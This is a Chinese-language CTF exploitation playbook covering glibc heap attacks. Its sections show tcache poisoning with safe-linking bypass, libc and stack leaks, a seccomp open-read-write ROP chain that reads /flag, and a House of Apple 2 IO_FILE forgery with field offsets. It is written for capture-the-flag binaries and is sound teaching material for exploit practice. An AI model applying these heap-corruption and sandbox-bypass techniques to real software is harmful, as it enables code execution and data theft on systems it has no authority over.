# 02 堆与沙箱

> 配套 `pwn-crypto/SKILL.md`、`references/heap-and-sandbox.md`。
> 先定 glibc 版本与分配器，再谈 tcache/IO_FILE；所有偏移用当前 libc 与调试器复核。

## 0. 堆题开局

```bash
ldd --version | head -1
strings -a libc.so.6 | grep -m1 'GNU C Library'
sha256sum ./chall ./libc.so.6
nm -D libc.so.6 2>/dev/null | grep -E '__free_hook|_IO_list_all'
```
| glibc | 关键变化 | 打法影响 |
|---|---|---|
| 2.26+ | tcache 引入 | 每 size 最多 7 个，LIFO |
| 2.29+ | tcache `key` | 二次 free 需处理 `e->key == tcache` |
| 2.32+ | safe-linking | `fd = target ^ (chunk_addr >> 12)` |
| 2.34+ | 移除 `__free_hook`/`__malloc_hook` | 改走 IO_FILE/exit_funcs/程序指针 |
| 2.35+ | 更多 IO vtable/一致性检查 | 先确认目标 libc 的 vtable 范围 |
**成功判据**：能说出 libc build id、tcache 上限、safe-linking 是否启用。
**失败判据**：只看 `ldd` 的系统 libc，没确认题目自带 `libc.so.6`。

## 1. 菜单适配与泄漏顺序

```python
def add(size, data=b""):
    p.sendlineafter(b"> ", b"1"); p.sendlineafter(b"size> ", str(size).encode())
    p.sendafter(b"data> ", data)
def free(i):
    p.sendlineafter(b"> ", b"2"); p.sendlineafter(b"idx> ", str(i).encode())
def edit(i, data):
    p.sendlineafter(b"> ", b"3"); p.sendlineafter(b"idx> ", str(i).encode())
    p.sendafter(b"data> ", data)
def show(i):
    p.sendlineafter(b"> ", b"4"); p.sendlineafter(b"idx> ", str(i).encode())
    return p.recvline().strip()
```
1. **堆**：释放两个同 size chunk，读第一个的 `fd`；2.32+ 先解码 `fd ^ (chunk >> 12)`。
2. **libc**：填满对应 tcache（7 个），再释放一个进 unsorted bin，读 `fd/bk`；
   `main_arena` 偏移用 `libc.symbols` 或 gdb `p &main_arena` 确认。
3. **栈**：libc 基址 + `environ` 偏移，读 `environ` 得栈地址。
**成功判据**：泄漏值页对齐；`vmmap` 段名正确；解码后 `fd` 是堆地址或 0。
**失败判据**：把堆地址当 libc；未解码 safe-linking；用错 libc 版本导致偏移全错。

## 2. tcache poison / UAF

```python
# 同一 chunk 入链两次：free(a); edit(a, ...); free(a)
# 2.29+ 先清 key，并确认该 size 的 tcache count < 7
edit(0, p64(target ^ (chunk_addr >> 12)))   # 2.32+ safe-linking
add(size)   # 取回原 chunk
add(size)   # malloc 返回 target
```
- 目标优先级：`__free_hook`（<2.34）→ `_IO_list_all`/`exit_funcs`（≥2.34）
  → 程序自身函数指针 → `environ` 回栈。
- `target` 必须可写且按 0x10 对齐；写 `system` 时把 `"/bin/sh\0"` 放到已知 chunk。
- 2.34+ 找不到 `__free_hook` 是正常现象（符号已移除），不是“偏移算错”。

**成功判据**：`malloc` 返回 `target`；`vis_heap_chunks` 能看到重复/重叠；触发后不 abort。
**失败判据**：tcache count 已满、`key` 未清、safe-linking 未编码、`target` 未 0x10 对齐。
## 3. seccomp 与 ORW

```bash
seccomp-tools dump ./chall
# 记录 arch、允许的 syscall、参数过滤；无工具时用 strace -f 观察
```
x86_64 常用号：`read=0 write=1 open=2 close=3 mprotect=10 openat=257 sendfile=40`。
先判断 flag 是否已被父进程打开：允许 `read` 时先试 `read(3, bss, 0x100)`。

```python
flag = next(libc.search(b"/flag\x00"))
bss = elf.bss() + 0x200
rop = ROP(libc)
rop.call(libc.symbols["open"], [flag, 0])
rop.call(libc.symbols["read"], [3, bss, 0x100])
rop.call(libc.symbols["write"], [1, bss, 0x100])
p.sendline(flat({OFFSET: rop.chain()}))
print(p.recvall(timeout=3))
```
- 只有 `openat`：`openat(AT_FDCWD=-100, path, 0)`；路径要先写入可写内存。
- 缺 `pop rdx`：ret2csu、SROP（`rt_sigreturn`）或 libc 内 `setcontext`。
- 允许 `mprotect`：把 shellcode 写到 bss，`mprotect(bss & ~0xfff, 0x1000, 7)` 后跳转。

**成功判据**：`strace`/seccomp 日志出现预期 `openat/read/write` 序列，输出含 flag；
shellcode 路线看到 `mprotect(...,7)` 返回 0。
**失败判据**：fd 猜错、路径不在可写内存、`openat` 第一参数不是 -100、x32 ABI 混用。
## 4. IO_FILE（glibc ≥2.34 常用）

```text
触发链：exit() -> _IO_flush_all_lockp() -> _IO_OVERFLOW(fp)
伪造 _IO_FILE_plus 在可写堆；vtable 必须落在 __libc_IO_vtables。
House of Apple 2 用 _IO_wfile_jumps，_flags=0、_IO_write_ptr>_IO_write_base，
_wide_data 的 write_base/write_ptr 置 0/1，其 _wide_vtable 指向 fake_wvt，
fake_wvt->__doallocate = system。
```
```python
# 字段偏移：_flags 0x00、_IO_write_base 0x20、_IO_write_ptr 0x28、
# _lock 0x88、_wide_data 0xA0、vtable 0xD8；地址按当前 libc 填。
fake = flat({0x00: 0, 0x20: 0, 0x28: 1, 0x88: lock_addr,
             0xA0: wide_data_addr, 0xD8: libc.symbols['_IO_wfile_jumps']}, length=0xE0)
```

- 触发前把 `_IO_list_all` 指向 fake，或走 `exit_funcs` 的 `__run_exit_handlers`。
- 先确认 `_IO_wfile_jumps` 在目标 libc 中存在；不同发行版可能裁剪。
- vtable 越界会触发 `_IO_vtable_check` abort，不要伪造到堆上。

**成功判据**：gdb 断在 `_IO_wfile_overflow`/`system`，`bt` 能看到 flush 链；
`p _IO_list_all` 指向伪造结构。
**失败判据**：vtable 不在合法段、`_wide_data` 未映射、`_lock` 为空、触发路径没走 flush。

## 5. 停止条件与证据

- 连续 3 轮同一路径无进展（泄漏不变、目标不可写、触发必 abort）→ 换路线；
  同一目标同类动态尝试最多 2 次，第二次失败必须停下汇报。
- 证据：checksec、glibc build id、seccomp 白名单原文、泄漏→基址计算、
  每次 malloc/free 的 size/index、exploit 10 次成功计数、flag 输出。

**误报/边界**：Full RELRO 只保护 GOT；`.fini_array`、`__exit_funcs` 和程序函数指针
仍可能可写，不等于“无解”。
